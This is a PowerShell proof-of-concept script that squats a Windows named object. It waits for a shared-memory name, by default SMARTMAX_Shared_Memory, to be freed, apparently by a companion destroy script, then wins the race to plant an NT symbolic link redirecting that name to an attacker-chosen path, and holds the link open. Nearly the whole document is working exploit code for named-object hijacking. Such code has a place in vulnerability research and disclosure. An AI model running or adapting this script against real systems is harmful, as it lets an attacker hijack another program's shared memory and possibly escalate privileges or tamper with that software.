<#
.SYNOPSIS
    Creates a link over an object name and holds it open,
    redirecting the name to a desired path.

.DESCRIPTION
    This script does not corrupt anything, so the terminal hosting it stays open.
    It waits (up to -TimeoutSeconds) for -Name to be free, then plants a symbolic 
    link of that name pointing at -TargetPath. If the name never frees, or the
    link cannot be created, it exits without retrying.

    Use Destroy-NamedObject.ps1 in a separate terminal to free the name. This script 
    can be launched first and will wait for the name to disappear, then win the race 
    to plant the link.

.PARAMETER Name
    Full NT path of the object, e.g.
    "\Sessions\1\BaseNamedObjects\SMARTMAX_Shared_Memory". Defaults to
    the current session's BaseNamedObjects path for SMARTMAX_Shared_Memory.

.PARAMETER TargetPath
    NT path the planted symbolic link should point at. Defaults to
    "\BaseNamedObjects\PoC".

.PARAMETER TimeoutSeconds
    How long to wait for the name to become free before planting. Defaults to 5.

.EXAMPLE
    .\Squat-NamedObject.ps1

.EXAMPLE
    .\Squat-NamedObject.ps1 -Name "\Sessions\1\BaseNamedObjects\SMARTMAX_Shared_Memory" -TargetPath "\BaseNamedObjects\PoC"
#>
[CmdletBinding(SupportsShouldProcess)]
param(
    [Parameter(Position = 0)]
    [string]$Name,

    [Parameter(Position = 1)]
    [string]$TargetPath = '\BaseNamedObjects\PoC',

    [ValidateRange(1, 3600)]
    [int]$TimeoutSeconds = 5
)

Import-Module NtObjectManager -ErrorAction Stop

# Default -Name to the current session's BaseNamedObjects path.
if (-not $PSBoundParameters.ContainsKey('Name')) {
    $session = (Get-NtProcess -Current).SessionId
    $Name = "\Sessions\$session\BaseNamedObjects\SMARTMAX_Shared_Memory"
}
$Path = $Name

# Split the full path into parent directory + leaf for existence probing.
$idx = $Path.LastIndexOf('\')
if ($idx -lt 1) {
    Write-Error "Invalid object path '$Path' (expected a full NT path like '\Sessions\1\BaseNamedObjects\Name')."
    return
}
$ParentPath = $Path.Substring(0, $idx)
$Leaf = $Path.Substring($idx + 1)

function Test-LeafPresent {
    param([string]$Parent, [string]$LeafName)
    $dir = $null
    try {
        $dir = Get-NtDirectory $Parent -ErrorAction Stop
    }
    catch {
        return $false   # parent gone -> the leaf cannot be present
    }
    try {
        return [bool]($dir.Query() | Where-Object { $_.Name -eq $LeafName })
    }
    finally {
        $dir.Close()
    }
}

# Wait for the name to be free.
if (Test-LeafPresent -Parent $ParentPath -LeafName $Leaf) {
    Write-Verbose "Object '$Path' is present; waiting up to $TimeoutSeconds s for it to become free."
    $sw = [System.Diagnostics.Stopwatch]::StartNew()
    while ($sw.Elapsed.TotalSeconds -lt $TimeoutSeconds) {
        if (-not (Test-LeafPresent -Parent $ParentPath -LeafName $Leaf)) { break }
        Start-Sleep -Milliseconds 250
    }
    $sw.Stop()

    if (Test-LeafPresent -Parent $ParentPath -LeafName $Leaf) {
        Write-Error "'$Path' is still present after $TimeoutSeconds s. Run Destroy-NamedObject.ps1 first, and retry."
        return
    }
    Write-Verbose "'$Path' is free after $([math]::Round($sw.Elapsed.TotalSeconds, 2)) s."
}
else {
    Write-Verbose "Object '$Path' is already free. Creating link..."
}

# Create the symbolic link.
if (-not $PSCmdlet.ShouldProcess($Path, "create symbolic link -> $TargetPath")) {
    return
}

$link = $null
try {
    $link = New-NtSymbolicLink -Path $Path -TargetPath $TargetPath -ErrorAction Stop
}
catch [NtCoreLib.NtException] {
    switch ($_.Exception.Status) {
        'STATUS_OBJECT_NAME_COLLISION' {
            Write-Error "Lost the race: '$Path' was recreated before the link could be created."
        }
        'STATUS_ACCESS_DENIED' {
            Write-Error "Access denied creating link at '$Path'."
        }
        default {
            Write-Error "Failed to create link '$Path' -> '$TargetPath': $($_.Exception.Message)"
        }
    }
    return
}
catch {
    Write-Error "Failed to create link '$Path' -> '$TargetPath': $($_.Exception.Message)"
    return
}

# Loiter
try {
    Write-Host "Created '$Path' -> '$TargetPath'. Keeping the link open. Press Ctrl+C to release." -ForegroundColor Green
    while ($true) { Start-Sleep -Seconds 1 }
}
finally {
    if ($link) { $link.Close() }   # closing the last handle deletes the link
    Write-Host "Link handle released; '$Path' removed." -ForegroundColor Yellow
}
